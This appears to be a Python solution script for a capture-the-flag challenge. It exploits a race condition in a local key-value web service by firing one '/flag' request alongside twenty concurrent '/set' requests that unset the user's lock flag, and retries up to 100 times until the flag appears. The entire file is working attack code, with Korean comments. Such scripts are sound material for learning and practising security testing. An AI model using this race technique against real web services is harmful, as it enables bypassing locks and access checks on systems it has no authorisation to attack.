#!/usr/bin/env python3
"""
Simple Race Condition Exploit - Alternative approach
"""

import requests
import asyncio
import aiohttp
import base64
import time

BASE_URL = "http://localhost:23001"

async def async_request(session, url, params):
    """비동기 HTTP 요청"""
    try:
        async with session.get(url, params=params) as response:
            return await response.text()
    except Exception as e:
        return f"Error: {str(e)}"

async def async_race_attack(username):
    """비동기를 이용한 race condition 공격"""
    async with aiohttp.ClientSession() as session:
        # 동시에 여러 요청 실행
        tasks = []
        
        # 플래그 요청
        tasks.append(async_request(session, f"{BASE_URL}/flag", {"username": username}))
        
        # unlock 요청들
        for _ in range(20):  # 20개의 unlock 요청
            tasks.append(async_request(session, f"{BASE_URL}/set", {
                "key": f"{username}_locked",
                "value": "false"
            }))
        
        # 모든 요청 동시 실행
        results = await asyncio.gather(*tasks)
        
        # 플래그 결과 확인
        flag_result = results[0]
        print(f"Flag result: {flag_result}")
        
        return flag_result

def setup_sync(username):
    """동기적으로 초기값 설정"""
    # apple 설정
    requests.get(f"{BASE_URL}/set", params={
        "key": f"{username}_apple",
        "value": "apple"
    })
    
    # banana 설정
    banana_encoded = base64.b64encode(b"banana").decode()
    requests.get(f"{BASE_URL}/set", params={
        "key": f"{username}_banana", 
        "value": banana_encoded
    })

async def main():
    username = f"async_user_{int(time.time())}"
    print(f"Using username: {username}")
    
    # 초기값 설정
    setup_sync(username)
    
    # 여러 번 시도
    for attempt in range(100):
        print(f"Attempt {attempt + 1}")
        
        result = await async_race_attack(username)
        
        if "poka{" in result:
            print(f"🎉 SUCCESS: {result}")
            break
        
        await asyncio.sleep(0.05)  # 짧은 대기

if __name__ == "__main__":
    asyncio.run(main())